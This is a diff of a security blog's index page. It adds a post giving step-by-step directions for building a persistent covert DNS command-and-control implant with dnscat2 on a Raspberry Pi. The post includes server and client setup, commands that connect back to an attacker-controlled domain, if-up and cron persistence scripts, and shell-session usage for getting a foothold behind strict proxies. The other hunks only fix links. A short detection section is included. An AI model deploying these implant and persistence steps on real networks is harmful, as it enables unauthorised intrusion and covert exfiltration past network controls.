@@ -3,7 +3,7 @@
 <head>
   <link href="https://gmpg.org/xfn/11" rel="profile">
   <meta http-equiv="content-type" content="text/html; charset=utf-8">
-  <meta name="generator" content="Hugo 0.15" />
+  <meta name="generator" content="Hugo 0.17" />
 
   
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
@@ -66,6 +66,149 @@
 <div class="posts">
 
       
+  <div class="post">
+    <h1 class="post-title">
+      <a href="https://www.thesubtlety.com/post/persistent-dnscat2/">
+        Persistent C2 with dnscat2
+      </a>
+    </h1>
+
+    <span class="post-date">Mon, Dec 19, 2016</span>
+
+    
+
+<p>Occasionally an environment has strict outbound rules with all traffic going through an authenticated proxy. This hampers exfiltration, especially if you don&rsquo;t currently have valid credentials but need a foothold into an environment without phishing for instance. If we can find a live network jack in some accessible place and the switch hands out an IP address via DHCP along with DNS servers, we can more than likely obtain a foothold into the network.</p>
+
+<p>Thanks to some awesome work by <a href="https://twitter.com/iagox86">iagox86</a>, these directions can be used to configure <a href="https://github.com/iagox86/dnscat2">dnscat2</a> to automatically connect back to your server over DNS in an automated fashion, similar to a PwnPlug.</p>
+
+<h2 id="prerequisites">Prerequisites</h2>
+
+<ul>
+<li>A linux box (raspberry pi)</li>
+<li>A domain name</li>
+<li>A VPS</li>
+</ul>
+
+<h2 id="directions">Directions</h2>
+
+<h3 id="authoritative-dns">Authoritative DNS</h3>
+
+<p>Configure an authoritative name server on the DNS provider account. Using namecheap for instance:</p>
+
+<p>Manage Domain &gt; Advanced DNS &gt; Add Personal DNS Servers &gt; <code>ns1 == ip.ad.dre.ss</code> and <code>ns2 == ip.ad.dre.ss</code></p>
+
+<p>Then, under Domain &gt; Use Custom DNS &gt; use <code>ns1.examplecom</code> and <code>ns2.example.com</code></p>
+
+<p>Check this is working by running on the server: <code>sudo nc -vv -l -u -p53</code> and from another machine <code>nslookup ns1.example.com</code> to verify traffic is hitting this IP.</p>
+
+<h3 id="set-up-dnscat2-server-side">Set up dnscat2 server side</h3>
+
+<p>Log in to your VPS, get dnscat2, and install it.</p>
+
+<pre><code># apt-get update
+# apt-get -y install ruby-dev git make g++
+# gem install bundler
+# git clone https://github.com/iagox86/dnscat2.git
+# cd dnscat2/server
+# bundle install
+</code></pre>
+
+<p>And start the server.</p>
+
+<pre><code># ruby /home/admin/dnscat2/server/dnscat2.rb --secret=verysecret ns1.example.com
+</code></pre>
+
+<h3 id="configure-the-client-raspberry-pi">Configure the client/Raspberry Pi</h3>
+
+<h4 id="compile-the-dnscat2-client">Compile the dnscat2 client</h4>
+
+<p>On the Raspberry Pi or client</p>
+
+<pre><code>$ git clone https://github.com/iagox86/dnscat2.git
+$ cd dnscat2/client/
+$ make
+</code></pre>
+
+<p>At this point you can run dnscat2 with the following to confirm things are working. We&rsquo;ll be coming back to this so no need to keep in running.</p>
+
+<pre><code>$ sudo /home/rpi/dnscat2/client/dnscat --secret=verysecret --dns domain=ns1.example.com,type=TXT
+</code></pre>
+
+<ul>
+<li>You can also leave out the domain and instead specify an ip: <code>./dnscat --dns=server=1.2.3.4,port=53</code> but this is a direct connection out port 53 which may be blocked. It also clearly shows dnscat2 on the wire and will likely be flagged by IDS/IPS</li>
+<li>You can specify various DNS record types but TXT records have been fairly stable for me in the past</li>
+</ul>
+
+<h4 id="configure-persistance">Configure Persistance</h4>
+
+<p>We want our little remote computer to always be connected to us. Every time it&rsquo;s plugged in, dnscat2 should be calling back to our infrastructure. In addition, DNS can be flaky so we always want to ensure there&rsquo;s always a callback.</p>
+
+<p>Make <code>eth0</code> ask for a DHCP address everytime it&rsquo;s plugged in</p>
+
+<pre><code>$cat /etc/networking/interfaces
+  auto eth0
+  allow-hotplug eth0
+  iface eth0 inet dhcp
+</code></pre>
+
+<p>Add an <code>interface up</code> start script</p>
+
+<pre><code>$cat /home/rpi/start_dnscat2
+  #!/bin/bash    
+  echo &quot;[+] Starting dnscat2...&quot;
+  tmux new -s dnscat -d /home/rpi/dnscat2/client/dnscat ns1.example.com
+$ln -s  /home/rpi/start_dnscat2 /etc/network/if-up.d/start_dnscat2
+$chmod +x /home/rpi/start_dnscat2
+</code></pre>
+
+<p>Configure <code>cron</code> to check every five minutes if <code>dnscat2</code> is running and start it if not.</p>
+
+<pre><code>$cat check_and_start_dnscat2.sh 
+#!/bin/bash
+
+if ! $(ps aux | grep -i &quot;[t]mux&quot; &gt; /dev/null); then
+    echo &quot;[!] Starting dnscat2...&quot;
+        /home/rpi/start_dnscat2
+else
+    echo &quot;[+] dnscat2 is running...&quot;
+fi
+
+$crontab -e
+*/5 * * * * /home/rpi/check_and_start_dnscat2.sh
+</code></pre>
+
+<p>That&rsquo;s it. Now whenever an interface comes up, dnscat2 will make a connection to the configured domain and check every 5 minutes if there is a connection, starting one if not.</p>
+
+<h3 id="dnscat2-reference">dnscat2 reference</h3>
+
+<p>dnscat2 isn&rsquo;t super intuitive so some operational notes for quick reference:</p>
+
+<ul>
+<li>Start the server under a tmux session</li>
+<li>Within the dnscat2 prompt, type <code>sessions</code> to see what you have available and interact with <code>sessions -i 1</code></li>
+<li>Within a session type <code>help</code> to list available commands and <code>shell</code> then <code>session -i &lt;window#&gt;</code> for an interactive shell</li>
+<li>Exit the shell session by <code>Control-z</code> or <code>exit</code></li>
+</ul>
+
+<h3 id="identifying-dnscat2-on-the-wire">Identifying dnscat2 on the wire</h3>
+
+<p>There are number of ways to identify malicious DNS traffic and <a href="https://www.sans.org/reading-room/whitepapers/dns/detecting-dns-tunneling-34152">this SANS paper</a> details quite a few methods of identification. In addition, in this case we&rsquo;re specifying TXT records which aren&rsquo;t too common. <a href="http://www.caida.org/publications/papers/2007/dns_anomalies/dns_anomalies.pdf">One paper</a> (Table 1) puts TXT record usage around 7% of a given large sample size. <a href="http://blog.dinaburg.org/2012/11/bitsquatting-pcap-analysis-part-2-query.html">Another</a> puts that usage at closer to less than 1%.</p>
+
+<p>It&rsquo;s difficult to directly prevent DNS tunnelling but with a bit of traffic and payload analysis an attacker who&rsquo;s not careful is likely to be identified.</p>
+
+<h3 id="resources">Resources</h3>
+
+<p>Most of this info is from iagox86&rsquo;s github and Lenny Zeltser&rsquo;s write up on dnscat2.</p>
+
+<ul>
+<li><a href="https://github.com/iagox86/dnscat2">https://github.com/iagox86/dnscat2</a></li>
+<li><a href="https://github.com/iagox86/dnscat2/blob/master/doc/authoritative_dns_setup.md">https://github.com/iagox86/dnscat2/blob/master/doc/authoritative_dns_setup.md</a></li>
+<li><a href="https://zeltser.com/c2-dns-tunneling/">https://zeltser.com/c2-dns-tunneling/</a></li>
+<li><a href="https://www.sans.org/reading-room/whitepapers/dns/detecting-dns-tunneling-34152">https://www.sans.org/reading-room/whitepapers/dns/detecting-dns-tunneling-34152</a></li>
+</ul>
+
+  </div>
+  
   <div class="post">
     <h1 class="post-title">
       <a href="https://www.thesubtlety.com/post/opendnss-appsec-training-lab/">
@@ -131,7 +274,8 @@ focused my attention on the lab. It is at this point, when the course turns from
 
 <ul>
 <li>I used Keepnote on my host machine to track everything. It&rsquo;s certainly not without its frustrations, but it does the job. Don&rsquo;t forget to back everything up!</li>
-<li>Write up every machine after popping, including a summary and detailed steps along with key screenshots - you will thank yourself later. It&rsquo;s easy to forget, and coming back a few weeks or months later while writing up your report because you forgot something and finding your documentation didn&rsquo;t include some small issue is frustrating.</li>
+<li>Write up every machine after popping, including a summary and detailed steps along with key screenshots - you will thank yourself later. It&rsquo;s easy to forget, and coming back a few weeks or months later while writing up your report because you forgot something and finding your documentation didn&rsquo;t include some small issue is frustrating.
+<br /></li>
 </ul>
 
 <p><br/>
@@ -146,7 +290,8 @@ been crashed by a previous student and Metasploit would have gotten me in immedi
 <ul>
 <li><a href="http://www.greyhathacker.net/?p=738">http://www.greyhathacker.net/?p=738</a></li>
 <li><a href="http://www.fuzzysecurity.com/tutorials/16.html">http://www.fuzzysecurity.com/tutorials/16.html</a></li>
-<li><a href="http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a><br /></li>
+<li><a href="http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a><br />
+<br /></li>
 </ul></li>
 </ul>
 
@@ -341,7 +486,7 @@ host              port  proto  name   state    info
 
 <p>Tip toeing around Snort rules and timers is an interesting game. Fyodor&rsquo;s Nmap <a href="http://nmap.org/book/">book</a> has quite a bit of information around this and makes for interesting reading. Another thing to note is the default User Agent for Nmap scripts is fairly conspicuous as seen below. According to <a href="http://www.kroosec.com/2012/02/making-nmap-scripting-engine-stealthier.html">this guy</a>, that can be easily changed in the nse lua settings.</p>
 
-<p>Another option for host and vulnerability discovery is via <a href="https://en.wikipedia.org/wiki/Nessus_(software">Nessus</a>). Nmap and it&rsquo;s version detection can get us a long way, but Nessus will give us a laundry list of poor configurations, out of date services, relevant CVEs, and fixes. The new HTML5 UI is quite nice to use; simply run a scan on your desired targets and export as as a nessus file (xml format) for Metasploit to import.</p>
+<p>Another option for host and vulnerability discovery is via <a href="https://en.wikipedia.org/wiki/Nessus_(software)">Nessus</a>. Nmap and it&rsquo;s version detection can get us a long way, but Nessus will give us a laundry list of poor configurations, out of date services, relevant CVEs, and fixes. The new HTML5 UI is quite nice to use; simply run a scan on your desired targets and export as as a nessus file (xml format) for Metasploit to import.</p>
 
 <p><strong>Anyways</strong></p>
 
@@ -594,7 +739,7 @@ Note: I'm actually using the host's bridged wired interface here as Security
 
     <span class="post-date">Tue, May 7, 2013</span>
 
-    <p>I recently bought a Raspberry Pi and installed <a href="http://archlinuxarm.org/platforms/armv6/raspberry-pi#qt-platform_tabs-ui-tabs2">Arch Linux ARM</a> on it. I came across a rather amusing blog post of someone using the <a href="https://en.wikipedia.org/wiki/Honeypot_(computing">honeypot</a>) <a href="https://code.google.com/p/kippo/">Kippo</a> and thought what fun. See <a href="http://www.iwatchedyourhack.org/">here</a> to watch elite hackers and their mad skillz. That&rsquo;s the great thing about Kippo - it records user sessions for playback.</p>
+    <p>I recently bought a Raspberry Pi and installed <a href="http://archlinuxarm.org/platforms/armv6/raspberry-pi#qt-platform_tabs-ui-tabs2">Arch Linux ARM</a> on it. I came across a rather amusing blog post of someone using the <a href="https://en.wikipedia.org/wiki/Honeypot_(computing)">honeypot</a> <a href="https://code.google.com/p/kippo/">Kippo</a> and thought what fun. See <a href="http://www.iwatchedyourhack.org/">here</a> to watch elite hackers and their mad skillz. That&rsquo;s the great thing about Kippo - it records user sessions for playback.</p>
 
 <p>Anyways, this post basically walks through what I did to get Kippo and <a href="http://bruteforce.gr/kippo-graph">kippo-graph</a> up and running on my RPi. This isn&rsquo;t a walk-you-through-every-step guide, so if you&rsquo;re following along your mileage may vary. Of course, the <a href="https://code.google.com/p/kippo/w/list">Wiki pages</a> over on Google Code are a good place to start. Or <a href="http://bruteforce.gr/installing-kippo-ssh-honeypot-on-ubuntu.html">here</a>. Or <a href="http://www.ctrl-alt-del.cc/2010/07/making-new-friends-with-kippo.html">here</a>. Everyone&rsquo;s done this! But without further adieu&hellip;</p>
 
